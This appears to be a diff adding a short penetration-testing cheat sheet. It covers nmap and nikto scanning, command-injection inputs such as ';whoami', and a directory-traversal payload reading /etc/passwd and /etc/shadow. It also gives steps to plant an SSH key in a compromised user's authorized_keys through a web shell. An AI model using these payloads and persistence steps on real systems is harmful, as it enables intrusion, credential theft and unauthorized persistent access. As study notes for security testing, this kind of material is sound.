@@ -1,0 +1,35 @@
+
+nmap -Pn -T4 --min-rate 2435434 <IP> -p-
+
+NMAP Scripting Engine:
+       /usr/share/nmap/scripts
+       nmap -Pn -T4 <ip> -p <ports> --script=banner.nse 
+                                    --script=http-enum.nse <ip> -p <port>      (use to enum well known paths/dir from websites)
+       nmap -p 445 --script smb-os-discovery <IP/subnet>        (OS, computer name, netbios name, domain)
+       
+       nikto -h <ip> -p <ports>
+       
+       
+       
+   Directory Traversal or Command Injection, for input fields.
+    Command Inj
+      ;whoami, 
+      ;pwd 
+    Directory Trav:   
+      ../../../../../../../../../etc/passwd (users/shell)  -OR- /etc/shadow
+      ^^ 
+      
+   /etc/hosts ;    
+   if web-shell.php can be used, ssh-keygen
+   
+     ssh-keygen -t rsa
+     cat ~/.ssh/id_rsa.pub
+     www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.
+     ls -la /users/home/directory      #check if .ssh exists
+     mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+     echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+     cat /users/home/directory/.ssh/authorized_keys
+
+
+   
+   
